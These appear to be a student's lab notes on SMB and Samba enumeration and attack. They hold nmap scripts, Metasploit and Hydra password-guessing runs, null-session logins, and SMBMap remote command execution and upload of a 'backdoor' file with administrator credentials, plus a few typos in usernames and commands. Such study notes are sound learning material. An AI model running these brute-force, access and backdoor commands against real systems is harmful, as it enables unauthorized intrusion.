# SMB NSE Scripts
```bash
nmap -p445 --script smb-protocols 10.4.31.90    --> (Protocols)

nmap -p445 --script smb-security-mode 10.4.31.90    --> (Security)

nmap -p445 --script smb-enum-sessions 10.4.31.90    --> (Sessions)   

nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbsserver_771 10.4.31.90

nmap -p445 --script smb-enum-shares 10.4.31.90    --> (Shares)

nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbsserver_771 10.4.31.90

nmap -p445 --script smb-enum-users 10.4.31.90    --> (Users)

nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbsserver_771 10.4.31.90

nmap -p445 --script smb-server-stats --script-args   smbusername=administrator,smbpassword=smbsserver_771 10.4.31.90  --> (Server Stats)

nmap -p445 --script smb-enum-domains --script-args   smbusername=administrator,smbpassword=smbsserver_771 10.4.31.90  --> (Domains)

nmap -p445 --script smb-enum-groups --script-args   smbusername=administrator,smbpassword=smbsserver_771 10.4.31.90  --> (Groups)

nmap -p445 --script smb-enum-services --script-args   smbusername=administrator,smbpassword=smbsserver_771 10.4.31.90  --> (Services)

nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbsserver_771 10.4.31.90 -->(Run ls command)



```


# SMB Dictionary Attack

#### Metasploit
```bash
use auxiliary/scanner/smb/smb_login

set rhosts 192.168.2.3
set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
set smbuser vagrant

run
```


#### Hydra
```bash
gzip -d /usr/share/wordlists/rockyou.txt.gz  -->  unzip rockyou
tar -xf flag.tar.gz   --> guznips and untars

hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.2.3 smb

-l              --> username
-P (UpperCase)  --> passowrd file
-p (LowerCase)  --> specific password
```

#### SMBMap
```bash
smbmap -H 192.168.2.3 -u admin -p password1
```

#### smbclient
```bash
smbclient -L 192.168.2.3 -U jane
```

#### Enum4Linux
```bash
enum4linux -r -u "admin" -p "password1" 192.168.2.3
```


# SMBMap


#### Identify SMB Version
```js
nmap -p445 --script smb-protocols 10.4.26.58
```

### SMBMap
```js
smbmap -u guest -p "" -d . -H 10.4.26.58
-u     --> username
-p ""  --> password null
-d .   --> current directory
```

```js
smbmap -u adminsitrator -p smbserver_771 -d . -H 10.4.26.58
```

### Command Execution with SMBMap
```js
smbmap -H 10.4.26.58 -u administrator -p smbserver_771 -x 'ipconfig'
```

#### List Drives SMBMap
```js
smbmap -H 10.4.26.58 -u administrator -p 'smbserver_771' -L
```

#### Connecting on listed Drives
```js
smbmap -H 10.4.26.58 -u administrator -p 'smbserver_771' -r 'C$'
```

### Upload File
```js
smbmap -H 10.4.26.58 -u administrator -p 'smbserver_771' --upload '/root/backdoor' 'C$\backdoor'
```

### Download File
```js
smbmap -H 10.4.26.58 -u administrator -p 'smbserver_771' --download 'C$\flag.txt'
```


# smbclient

```bash
smbclient //192.168.3.2/Public -N

-N    --> Null Password
```

smb> more flag.txt   -->  reads the flag
smb> get flag.txt      -->  downloads the flag from share


```bash
smbclient -L 192.168.2.3 -U jane

smbclient //192.168.2.3/jane -U jane

smbclient //192.168.2.3/admin -U admin
```

# Samba 1

```bash
nmap 192.223.132.3 -sV -p 139,445
nmap 192.223.132.3 -sU --top-port 25 --open -sV

nmap 192.223.132.3 -p 445  --script smb-os-discovery
```


### Metasploit
```metasploit 
use auxiliary/scanner/smb/smb_version
```


### nmblookup
```shell
nmblookup -A 192.223.132.3   <20> --> means that we can connect to that server
```



### smbclient
```shell
smbclient -L 192.223.132.3 -N
```

#### rpcclient
```bash
rpcclient -U "" -N 192.223.132.3

-U ""  --> Null Username
-P     --> no password
```


# Samba 2

#### rpcclient 
```bash
rpcclient -U "" -N 192.186.130.3    --> Connect with Null Session
$>srvinfo
$>enumdomusers         --> enumerates users
$>lookupnames admin    --> looks for admin SID
```

### enum4Linux
```bash
enum4linux -o 192.186.130.3   --> OS Detection

enum4linux -U 192.186.130.3   --> User Enumeration
```

#### smbclient
```bash
smbclient -L 192.186.130.3 -N  --> List Null Sessions
```

#### Nmap Script
```bash
nmap 192.186.130.3 -p445 --script smb-protocols   --> Determine Dialects (Versions)

nmap 192.186.130.3 -p445 --script smb-enum-users  --> Enumerate SMB Users
```

#### Metasploit
```bash
use auxiliary/scanner/smb/smb2

use auxiliary/scanner/smb/smb_enumusers
```


#### User Enumerations on Samba
```bash
nmap 192.186.130.3 -p445 --script smb-enum-users

msfconsole
msf6> use auxiliary/scanner/smb/smb_enumusers

enum4linux -U 192.186.130.3

rpcclient -U "" -N 192.186.130.3
$>enumdomusers    --> enumerates users
$>lookupnames admin
```

### Enumerate Shares
```bash
nmap 192.168.2.3 -p445 --script smb-enum-shares

msfconsole
msf6> use auxiliary/scanner/smb/smb_enumshares

enum4linux -S 192.168.2.3

smbclient -L 192.168.2.3 -N
```

### Enumerate Groups
```bash
nmap 192.168.2.3 -p445 smb-enum-groups

msfconsole
msf6> use auxiliary/scanner/smb/smb_enumgroups

enum4linux -G 192.168.2.3

rpcclient -U "" -N 192.168.2.3
$> enumdomgroups
```

#### Printer Info on Samba
```bash
enum4linux -i 192.168.2.3
```


